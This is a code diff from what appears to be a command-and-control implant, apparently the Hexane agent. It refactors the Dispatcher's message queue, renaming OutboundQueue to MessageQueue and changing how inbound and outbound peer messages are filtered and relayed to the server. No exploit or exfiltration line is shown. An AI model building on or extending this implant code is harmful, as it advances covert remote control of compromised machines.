@@ -55,7 +55,7 @@ namespace Dispatcher {
         }
     }
 
-    VOID OutboundQueue(_stream *const out) {
+    VOID MessageQueue(_stream *const out) {
         HEXANE
 
         _parser parser = { };
@@ -130,22 +130,27 @@ namespace Dispatcher {
 
         _parser parser  = { };
         for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
-            if (B_PTR(head->buffer)[0] != 0) {
-                continue;
+            // todo: prepend outbound messages with 0, inbound with 1
+
+            if (head->buffer) {
+                if (B_PTR(head->buffer)[0] == 1) {
+                    continue;
+                }
+
+                Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
+                Stream::PackDword(out, head->peer_id);
+                Stream::PackDword(out, head->task_id);
+                Stream::PackDword(out, head->msg_type);
+
+                // egress to server should prepend msg_buffer with length
+                if (Ctx->root) {
+                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
+                } else {
+                    Utils::AppendBuffer(&out->buffer, head->buffer, R_CAST(uint32_t*, &out->length), head->length);
+                }
+
+                break;
             }
-
-            Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
-            Stream::PackDword(out, head->peer_id);
-            Stream::PackDword(out, head->task_id);
-            Stream::PackDword(out, head->msg_type);
-
-            if (Ctx->root) {
-                Stream::PackBytes(out, B_PTR(head->buffer), head->length);
-            } else {
-                Utils::AppendBuffer(&out->buffer, head->buffer, R_CAST(uint32_t*, &out->length), head->length);
-            }
-
-            break;
         }
 
         Parser::DestroyParser(&parser);
@@ -156,7 +161,7 @@ namespace Dispatcher {
 
         if (in) {
             if (PeekPeerId(in) != Ctx->session.peer_id) {
-                OutboundQueue(in);
+                MessageQueue(in);
             } else {
                 CommandDispatch(in);
             }
@@ -183,7 +188,7 @@ namespace Dispatcher {
             return;
 #else
             const auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
-            Dispatcher::OutboundQueue(entry);
+            Dispatcher::MessageQueue(entry);
             goto retry;
 #endif
         }
